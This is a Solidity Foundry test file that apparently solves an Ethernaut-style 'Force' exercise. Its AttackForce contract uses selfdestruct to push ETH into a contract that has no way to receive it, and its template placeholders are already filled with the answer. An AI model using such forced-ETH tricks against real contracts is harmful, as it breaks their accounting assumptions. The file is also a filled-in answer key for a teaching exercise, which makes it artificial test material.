// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Force} from "../src/Force.sol";

/// @dev Fill in — Force has no receive/fallback, so normal ETH sends fail.
///      Classic approach: selfdestruct / send ETH in a way the target cannot reject.
contract AttackForce {
    Force public immutable target;

    constructor(Force _target) {
        target = _target;
    }

    // Fund this contract, then force the ETH into `target`.
    function attack() external payable {
        // ========== YOUR ATTACK LOGIC HERE ==========
        // Hint: Force cannot receive ETH via normal transfer/call
        //       because it has neither receive() nor fallback().
        //       Look up how selfdestruct(address) forces ETH into an address.
        // ========== END ATTACK LOGIC ==========
        selfdestruct(payable(address(target)));
    }
}

contract ForceTest is Test {
    Force public target;
    AttackForce public attackContract;

    address public attacker = makeAddr("attacker");

    function setUp() public {
        target = new Force();

        vm.prank(attacker);
        attackContract = new AttackForce(target);

        // Give attacker ETH to force into the empty contract.
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        // Win condition:
        //   address(target).balance > 0
        //
        // Hints (look at Force.sol carefully):
        //   - The contract is empty: no receive(), no payable fallback()
        //   - So address(target).call{value: 1}("") will revert
        //   - You must force ETH in a way that skips the recipient's code
        //
        // Tip (Foundry):
        //   attackContract.attack{value: 1 wei}();

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        // e.g. attackContract.attack{value: 1 wei}();
        // ========== END EXPLOIT ==========
        attackContract.attack{value: 1 wei}();

        vm.stopPrank();

        assertGt(address(target).balance, 0, "Force balance should be > 0");
    }
}
